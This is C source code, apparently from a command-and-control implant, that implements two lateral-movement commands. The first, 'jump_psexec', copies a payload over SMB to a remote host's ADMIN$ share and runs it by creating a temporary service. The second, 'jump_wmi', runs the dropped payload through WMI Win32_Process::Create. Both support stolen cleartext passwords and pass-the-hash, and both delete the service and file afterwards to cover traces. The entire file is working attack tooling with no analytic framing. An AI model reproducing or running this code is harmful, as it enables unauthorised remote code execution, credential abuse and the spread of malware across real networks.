/*
 * Lateral Movement Commands
 *
 *  jump_psexec  — Remote command execution via Windows Service Control Manager.
 *  jump_wmi     — Remote command execution via WMI Win32_Process::Create (COM/DCOM).
 */

#include "Tasks/LateralMovement.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Debug.h"


#ifdef INCLUDE_CMD_JUMP_PSEXEC

#include <winsvc.h>

/**
 * @brief Lateral movement via Windows Service Control Manager.
 *
 *  Parameters (in pack order):
 *    1. target       PCHAR  — hostname or IP of the remote host
 *    2. file_name    PCHAR  — random 10-char .exe name for the remote drop
 *    3. payload_data PBYTE  — raw executable bytes to write to the remote host
 *    4. command      PCHAR  — optional extra arguments to append to the binary path
 *    5. service_name PCHAR  — service name to create (empty → random name)
 *
 *  Flow:
 *    1. Write payload bytes to \\target\ADMIN$\Temp\<file_name> via SMB
 *    2. Connect to remote SCM via \\target
 *    3. Create a SERVICE_WIN32_OWN_PROCESS | SERVICE_DEMAND_START service whose
 *       binary path is  C:\Windows\Temp\<file_name> [extra args]
 *    4. StartService  (timeout error 1053 is expected for non-SCM-aware binaries)
 *    5. Sleep briefly, then stop and delete the service entry
 *    6. Best-effort delete of the dropped file
 *
 *  Credential modes (all optional — omit for current token):
 *    username   PCHAR — "DOMAIN\\User" or just "User" for local accounts
 *    password   PCHAR — cleartext password (mutually exclusive with hash)
 *    hash       PCHAR — NT hash hex string for pass-the-hash (mutually exclusive with password)
 */
VOID LateralMovementPsexec(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    SC_HANDLE       hSCM        = NULL;
    SC_HANDLE       hSvc        = NULL;
    SERVICE_STATUS  svcStatus   = { 0 };
    HANDLE          hFile       = INVALID_HANDLE_VALUE;
    HANDLE          hLogonToken = NULL;

    SIZE_T  sz        = 0;
    UINT32  payloadSz = 0;

    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg < 3)
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    PCHAR  target    = ParserStringCopy(arguments, &sz); sz = 0;
    PCHAR  fileName  = ParserStringCopy(arguments, &sz); sz = 0;
    PBYTE  payload   = ParserGetBytes(arguments, &payloadSz);
    PCHAR  command   = (nbArg >= 4) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    PCHAR  svcParam  = (nbArg >= 5) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    PCHAR  credUser  = (nbArg >= 6) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    PCHAR  credPass  = (nbArg >= 7) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    PCHAR  credHash  = (nbArg >= 8) ? ParserStringCopy(arguments, &sz) : NULL;

    if (!target || !target[0] || !fileName || !fileName[0] || !payload || payloadSz == 0)
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        goto cleanup;
    }

    /* Build the UNC path for writing: \\target\ADMIN$\Temp\<fileName>
     * ADMIN$ maps to C:\Windows, so this lands at C:\Windows\Temp\<fileName> */
    char dropPath[MAX_PATH] = { 0 };
    _snprintf(dropPath, MAX_PATH - 1, "\\\\%s\\ADMIN$\\Temp\\%s", target, fileName);

    /* Build the local execution path + optional extra args */
    char execPath[MAX_PATH + 256] = { 0 };
    if (command && command[0])
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s %s", fileName, command);
    else
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s", fileName);

    /* Explicit credentials: impersonate a net-only logon (password or PTH).
     * LOGON32_LOGON_NEW_CREDENTIALS creates a logon session for network calls
     * only — local token rights are unchanged. The credential (pass or hash)
     * is used verbatim for NTLM/Kerberos authentication to the remote host. */
    if (credUser && credUser[0])
    {
        PCHAR cred = (credHash && credHash[0]) ? credHash :
                     (credPass && credPass[0]) ? credPass : NULL;
        if (cred)
        {
            /* Split "DOMAIN\\user" into separate domain and user parts */
            char credDomain[256] = ".";
            char credUserPart[256] = { 0 };
            strncpy(credUserPart, credUser, sizeof(credUserPart) - 1);
            PCHAR bs = strchr(credUserPart, '\\');
            if (bs) { *bs = '\0'; strncpy(credDomain, credUserPart, sizeof(credDomain) - 1); memmove(credUserPart, bs + 1, strlen(bs + 1) + 1); }

            _dbg("[psexec] LogonUser: domain=%s user=%s pth=%d", credDomain, credUserPart, (credHash && credHash[0]));
            if (!LogonUserA(credUserPart, credDomain, cred,
                             LOGON32_LOGON_NEW_CREDENTIALS,
                             LOGON32_PROVIDER_DEFAULT,
                             &hLogonToken))
            {
                DWORD error = GetLastError();
                _err("[psexec] LogonUser failed: %d", error);
                PackageError(taskUuid, error);
                goto cleanup;
            }
            if (!ImpersonateLoggedOnUser(hLogonToken))
            {
                DWORD error = GetLastError();
                _err("[psexec] ImpersonateLoggedOnUser failed: %d", error);
                PackageError(taskUuid, error);
                goto cleanup;
            }
        }
    }

    /* 1. Drop payload to remote host via SMB (runs under impersonated identity if set) */
    hFile = CreateFileA(dropPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("[psexec] Failed to create remote file %s: %d", dropPath, error);
        PackageError(taskUuid, error);
        goto cleanup;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(hFile, payload, (DWORD)payloadSz, &bytesWritten, NULL) ||
        bytesWritten != (DWORD)payloadSz)
    {
        DWORD error = GetLastError();
        _err("[psexec] Failed to write payload to %s: %d", dropPath, error);
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
        DeleteFileA(dropPath);
        PackageError(taskUuid, error);
        goto cleanup;
    }
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    /* Resolve service name: use provided or generate a random one */
    char svcName[32] = { 0 };
    if (svcParam && svcParam[0] != '\0')
    {
        _snprintf(svcName, sizeof(svcName) - 1, "%s", svcParam);
    }
    else
    {
        srand((unsigned int)GetTickCount() ^ (unsigned int)(ULONG_PTR)taskUuid);
        _snprintf(svcName, sizeof(svcName) - 1, "svc%08x", (unsigned int)rand());
    }

    _dbg("[psexec] Target:   %s", target);
    _dbg("[psexec] DropPath: %s", dropPath);
    _dbg("[psexec] ExecPath: %s", execPath);
    _dbg("[psexec] Service:  %s", svcName);

    /* 2. Connect to remote Service Control Manager */
    hSCM = OpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
    {
        DWORD error = GetLastError();
        _err("[psexec] OpenSCManager failed on %s: %d", target, error);
        DeleteFileA(dropPath);
        PackageError(taskUuid, error);
        goto cleanup;
    }

    /* 3. Create the service pointing directly at the dropped binary */
    hSvc = CreateServiceA(
        hSCM,
        svcName,                            // Service name
        svcName,                            // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        execPath,                           // Binary path (C:\Windows\Temp\<name>)
        NULL,                               // Load order group
        NULL,                               // Tag ID
        NULL,                               // Dependencies
        NULL,                               // Run as (SYSTEM)
        NULL                                // Password
    );

    if (!hSvc)
    {
        DWORD error = GetLastError();
        _err("[psexec] CreateService failed: %d", error);
        DeleteFileA(dropPath);
        PackageError(taskUuid, error);
        goto cleanup;
    }

    /* 4. Start the service — ignore timeout (1053) for non-SCM-aware binaries */
    if (!StartServiceA(hSvc, 0, NULL))
    {
        DWORD error = GetLastError();
        if (error != ERROR_SERVICE_REQUEST_TIMEOUT)
        {
            _err("[psexec] StartService failed: %d", error);
            PackageError(taskUuid, error);
            DeleteService(hSvc);
            DeleteFileA(dropPath);
            goto cleanup;
        }
        _dbg("[psexec] StartService timeout (expected for non-SCM-aware binary)");
    }

    /* 5. Let the payload start, then clean up the service entry */
    Sleep(2000);
    ControlService(hSvc, SERVICE_CONTROL_STOP, &svcStatus);
    DeleteService(hSvc);

    /* 6. Best-effort file cleanup — may fail if the process is still holding it */
    DeleteFileA(dropPath);

    /* 7. Report success */
    PPackage data = PackageInit(0, FALSE);
    PackageAddFormatPrintf(data, FALSE,
        "Executed on %s via service \"%s\".\nDropped: %s\n", target, svcName, dropPath);
    PackageComplete(taskUuid, data);
    PackageDestroy(data);

cleanup:
    if (hLogonToken) { RevertToSelf(); CloseHandle(hLogonToken); }
    if (hSvc)  CloseServiceHandle(hSvc);
    if (hSCM)  CloseServiceHandle(hSCM);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (target)   LocalFree(target);
    if (fileName) LocalFree(fileName);
    if (command)  LocalFree(command);
    if (svcParam) LocalFree(svcParam);
    if (credUser) LocalFree(credUser);
    if (credPass) LocalFree(credPass);
    if (credHash) LocalFree(credHash);
    /* payload points into the parser's internal buffer — do NOT LocalFree it */
}

#endif  // INCLUDE_CMD_JUMP_PSEXEC


#ifdef INCLUDE_CMD_JUMP_WMI

/*
 * COM/WMI headers — CINTERFACE gives us the C-style vtable access pattern.
 * The CLSID/IID for IWbemLocator are hard-coded to avoid linking wbemuuid.
 */
#define _WIN32_DCOM
#define CINTERFACE
#include <objbase.h>
#include <wbemidl.h>

/* {4590F811-1D3A-11D0-891F-00AA004B2E24} */
static const CLSID CLSID_WbemLocatorX = {
    0x4590f811, 0x1d3a, 0x11d0,
    { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

/* {DC12A687-737F-11CF-884D-00AA004B2E24} */
static const IID IID_IWbemLocatorX = {
    0xdc12a687, 0x737f, 0x11cf,
    { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

/* Helper: convert narrow string to a freshly allocated BSTR (caller must SysFreeString) */
static BSTR NarrowToBstr(PCHAR src)
{
    if (!src || !src[0]) return NULL;
    int wlen = MultiByteToWideChar(CP_ACP, 0, src, -1, NULL, 0);
    WCHAR *tmp = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)wlen * sizeof(WCHAR));
    if (!tmp) return NULL;
    MultiByteToWideChar(CP_ACP, 0, src, -1, tmp, wlen);
    BSTR result = SysAllocString(tmp);
    HeapFree(GetProcessHeap(), 0, tmp);
    return result;
}

/**
 * @brief Lateral movement via WMI Win32_Process::Create.
 *
 *  Parameters (in pack order):
 *    1. target       PCHAR — hostname or IP of the remote host
 *    2. file_name    PCHAR — random 10-char .exe name for the remote drop
 *    3. payload_data PBYTE — raw executable bytes to write to the remote host
 *    4. command      PCHAR — optional extra arguments appended to the binary path
 *    5. username     PCHAR — optional "DOMAIN\\User" (empty → use current token)
 *    6. password     PCHAR — optional password (required if username is set)
 *
 *  Flow:
 *    1. Write payload bytes to \\target\ADMIN$\Temp\<file_name> via SMB
 *    2. CoInitializeEx / CoInitializeSecurity
 *    3. CoCreateInstance(IWbemLocator)
 *    4. IWbemLocator::ConnectServer → \\target\root\cimv2
 *    5. CoSetProxyBlanket for impersonation
 *    6. GetObject("Win32_Process") + GetMethod("Create")
 *    7. SpawnInstance + Put("CommandLine", "C:\Windows\Temp\<file_name> [args]")
 *    8. ExecMethod → read ProcessId from out-params
 *    9. Best-effort delete of the dropped file
 *
 *  Credential modes (all optional — omit for current token):
 *    username  PCHAR — "DOMAIN\\User" (supply with password OR hash)
 *    password  PCHAR — cleartext password (mutually exclusive with hash)
 *    hash      PCHAR — NT hash hex for pass-the-hash; token impersonation path,
 *                      ConnectServer called with NULL user/pass
 */
VOID LateralMovementWmi(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    HRESULT              hr              = S_OK;
    IWbemLocator        *pLoc            = NULL;
    IWbemServices       *pSvc            = NULL;
    IWbemClassObject    *pClass          = NULL;
    IWbemClassObject    *pInParamsDef    = NULL;
    IWbemClassObject    *pInParams       = NULL;
    IWbemClassObject    *pOutParams      = NULL;
    HANDLE               hFile           = INVALID_HANDLE_VALUE;
    HANDLE               hLogonToken     = NULL;

    BSTR bstrResource       = NULL;
    BSTR bstrUser           = NULL;
    BSTR bstrPass           = NULL;
    BSTR bstrWin32Process   = NULL;
    BSTR bstrCreate         = NULL;
    BSTR bstrCommandLine    = NULL;
    BSTR bstrCmdLineKey     = NULL;
    BSTR bstrReturnValue    = NULL;
    BSTR bstrProcessId      = NULL;

    VARIANT varCmd          = { 0 };
    VARIANT varRetVal       = { 0 };
    VARIANT varPid          = { 0 };

    PCHAR  target    = NULL;
    PCHAR  fileName  = NULL;
    PBYTE  payload   = NULL;
    UINT32 payloadSz = 0;
    PCHAR  command   = NULL;
    PCHAR  username  = NULL;
    PCHAR  password  = NULL;
    PCHAR  ntlm_hash = NULL;

    SIZE_T sz = 0;

    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg < 3)
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    target    = ParserStringCopy(arguments, &sz); sz = 0;
    fileName  = ParserStringCopy(arguments, &sz); sz = 0;
    payload   = ParserGetBytes(arguments, &payloadSz);
    command   = (nbArg >= 4) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    username  = (nbArg >= 5) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    password  = (nbArg >= 6) ? ParserStringCopy(arguments, &sz) : NULL; sz = 0;
    ntlm_hash = (nbArg >= 7) ? ParserStringCopy(arguments, &sz) : NULL;

    if (!target || !target[0] || !fileName || !fileName[0] || !payload || payloadSz == 0)
    {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        goto cleanup;
    }

    /* Build the UNC drop path and local execution path */
    char dropPath[MAX_PATH] = { 0 };
    _snprintf(dropPath, MAX_PATH - 1, "\\\\%s\\ADMIN$\\Temp\\%s", target, fileName);

    char execPath[MAX_PATH + 256] = { 0 };
    if (command && command[0])
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s %s", fileName, command);
    else
        _snprintf(execPath, sizeof(execPath) - 1, "C:\\Windows\\Temp\\%s", fileName);

    _dbg("[wmi] Target:   %s", target);
    _dbg("[wmi] DropPath: %s", dropPath);
    _dbg("[wmi] ExecPath: %s", execPath);

    /* 1. Drop payload to remote host via SMB */
    hFile = CreateFileA(dropPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("[wmi] Failed to create remote file %s: %d", dropPath, error);
        PackageError(taskUuid, error);
        goto cleanup;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(hFile, payload, (DWORD)payloadSz, &bytesWritten, NULL) ||
        bytesWritten != (DWORD)payloadSz)
    {
        DWORD error = GetLastError();
        _err("[wmi] Failed to write payload to %s: %d", dropPath, error);
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
        DeleteFileA(dropPath);
        PackageError(taskUuid, error);
        goto cleanup;
    }
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    /* Credential setup:
     * - PTH (ntlm_hash set): LogonUser with the hash as credential + impersonate.
     *   ConnectServer is then called with NULL user/pass — DCOM uses the thread's
     *   impersonation token, which carries the PTH logon session.
     * - Cleartext password (password set): pass user/pass directly to ConnectServer
     *   (existing DCOM auth path — no impersonation needed).
     * - Neither: current process token is used. */
    BOOL use_pth = (ntlm_hash && ntlm_hash[0] && username && username[0]);
    if (use_pth)
    {
        char pthDomain[256] = ".";
        char pthUser[256]   = { 0 };
        strncpy(pthUser, username, sizeof(pthUser) - 1);
        PCHAR bs = strchr(pthUser, '\\');
        if (bs) { *bs = '\0'; strncpy(pthDomain, pthUser, sizeof(pthDomain) - 1); memmove(pthUser, bs + 1, strlen(bs + 1) + 1); }

        _dbg("[wmi] PTH: domain=%s user=%s", pthDomain, pthUser);
        if (!LogonUserA(pthUser, pthDomain, ntlm_hash,
                         LOGON32_LOGON_NEW_CREDENTIALS,
                         LOGON32_PROVIDER_DEFAULT,
                         &hLogonToken))
        {
            DWORD error = GetLastError();
            _err("[wmi] LogonUser (PTH) failed: %d", error);
            DeleteFileA(dropPath);
            PackageError(taskUuid, error);
            goto cleanup;
        }
        if (!ImpersonateLoggedOnUser(hLogonToken))
        {
            DWORD error = GetLastError();
            _err("[wmi] ImpersonateLoggedOnUser failed: %d", error);
            DeleteFileA(dropPath);
            PackageError(taskUuid, error);
            goto cleanup;
        }
    }

    /* 2. COM initialisation */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        _err("[wmi] CoInitializeEx failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* Ignore E_ALREADY_INITIALIZED */
    CoInitializeSecurity(
        NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL);

    /* 2. Create IWbemLocator */
    hr = CoCreateInstance(
        &CLSID_WbemLocatorX, NULL,
        CLSCTX_INPROC_SERVER,
        &IID_IWbemLocatorX,
        (LPVOID *)&pLoc);

    if (FAILED(hr))
    {
        _err("[wmi] CoCreateInstance(IWbemLocator) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* 3. Connect to remote WMI namespace */
    {
        WCHAR wResource[512] = { 0 };
        _snwprintf(wResource, 511, L"\\\\%S\\root\\cimv2", target);
        bstrResource = SysAllocString(wResource);
    }

    bstrUser = use_pth ? NULL : NarrowToBstr(username);
    bstrPass = use_pth ? NULL : NarrowToBstr(password);

    hr = pLoc->lpVtbl->ConnectServer(
        pLoc,
        bstrResource,
        bstrUser,   /* NULL → use current token */
        bstrPass,
        NULL,       /* locale */
        0,          /* security flags */
        NULL,       /* authority */
        NULL,       /* context */
        &pSvc);

    if (FAILED(hr))
    {
        _err("[wmi] ConnectServer to %s failed: 0x%lx", target, hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* 4. Set proxy blanket for impersonation on the returned IWbemServices */
    CoSetProxyBlanket(
        (IUnknown *)pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE);

    /* 5a. Get the Win32_Process class object */
    bstrWin32Process = SysAllocString(L"Win32_Process");
    hr = pSvc->lpVtbl->GetObject(
        pSvc, bstrWin32Process, 0, NULL, &pClass, NULL);

    if (FAILED(hr))
    {
        _err("[wmi] GetObject(Win32_Process) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* 5b. Get the Create method in-parameter definition */
    bstrCreate = SysAllocString(L"Create");
    hr = pClass->lpVtbl->GetMethod(
        pClass, bstrCreate, 0, &pInParamsDef, NULL);

    if (FAILED(hr))
    {
        _err("[wmi] GetMethod(Create) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* 6a. Spawn an in-params instance */
    hr = pInParamsDef->lpVtbl->SpawnInstance(pInParamsDef, 0, &pInParams);
    if (FAILED(hr))
    {
        _err("[wmi] SpawnInstance failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* 6b. Set the CommandLine property to the dropped binary path */
    VariantInit(&varCmd);
    bstrCommandLine = NarrowToBstr(execPath);
    V_VT(&varCmd)   = VT_BSTR;
    V_BSTR(&varCmd) = bstrCommandLine;

    bstrCmdLineKey = SysAllocString(L"CommandLine");
    hr = pInParams->lpVtbl->Put(pInParams, bstrCmdLineKey, 0, &varCmd, 0);
    VariantClear(&varCmd);   /* frees bstrCommandLine; do not SysFreeString separately */
    bstrCommandLine = NULL;

    if (FAILED(hr))
    {
        _err("[wmi] Put(CommandLine) failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* 7. Execute Win32_Process::Create */
    hr = pSvc->lpVtbl->ExecMethod(
        pSvc,
        bstrWin32Process,
        bstrCreate,
        0, NULL,
        pInParams,
        &pOutParams,
        NULL);

    if (FAILED(hr))
    {
        _err("[wmi] ExecMethod failed: 0x%lx", hr);
        PackageError(taskUuid, (DWORD)hr);
        goto cleanup;
    }

    /* Read WMI return value and PID from out-params */
    VariantInit(&varRetVal);
    VariantInit(&varPid);

    bstrReturnValue = SysAllocString(L"ReturnValue");
    bstrProcessId   = SysAllocString(L"ProcessId");

    pOutParams->lpVtbl->Get(pOutParams, bstrReturnValue, 0, &varRetVal, NULL, NULL);
    if (V_I4(&varRetVal) != 0)
    {
        _err("[wmi] Win32_Process::Create returned %d", V_I4(&varRetVal));
        PackageError(taskUuid, (UINT32)V_I4(&varRetVal));
        goto cleanup;
    }

    pOutParams->lpVtbl->Get(pOutParams, bstrProcessId, 0, &varPid, NULL, NULL);

    /* Best-effort cleanup — may fail if process is still holding the file */
    DeleteFileA(dropPath);

    PPackage data = PackageInit(0, FALSE);
    PackageAddFormatPrintf(data, FALSE,
        "Process created on %s, PID: %d\nDropped: %s\n", target, V_I4(&varPid), dropPath);
    PackageComplete(taskUuid, data);
    PackageDestroy(data);

cleanup:
    VariantClear(&varRetVal);
    VariantClear(&varPid);

    if (pOutParams)     pOutParams->lpVtbl->Release(pOutParams);
    if (pInParams)      pInParams->lpVtbl->Release(pInParams);
    if (pInParamsDef)   pInParamsDef->lpVtbl->Release(pInParamsDef);
    if (pClass)         pClass->lpVtbl->Release(pClass);
    if (pSvc)           pSvc->lpVtbl->Release(pSvc);
    if (pLoc)           pLoc->lpVtbl->Release(pLoc);

    /* Best-effort: ensure file is removed even on COM error paths.
     * Silently fails if already deleted or never created. */
    if (dropPath[0]) DeleteFileA(dropPath);

    SysFreeString(bstrResource);
    SysFreeString(bstrUser);
    SysFreeString(bstrPass);
    SysFreeString(bstrWin32Process);
    SysFreeString(bstrCreate);
    SysFreeString(bstrCommandLine);
    SysFreeString(bstrCmdLineKey);
    SysFreeString(bstrReturnValue);
    SysFreeString(bstrProcessId);

    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hLogonToken) { RevertToSelf(); CloseHandle(hLogonToken); }
    if (target)   LocalFree(target);
    if (fileName) LocalFree(fileName);
    if (command)  LocalFree(command);
    if (username) LocalFree(username);
    if (password) LocalFree(password);
    if (ntlm_hash) LocalFree(ntlm_hash);
    /* payload points into the parser's internal buffer — do NOT LocalFree it */

    CoUninitialize();
}

#endif  // INCLUDE_CMD_JUMP_WMI
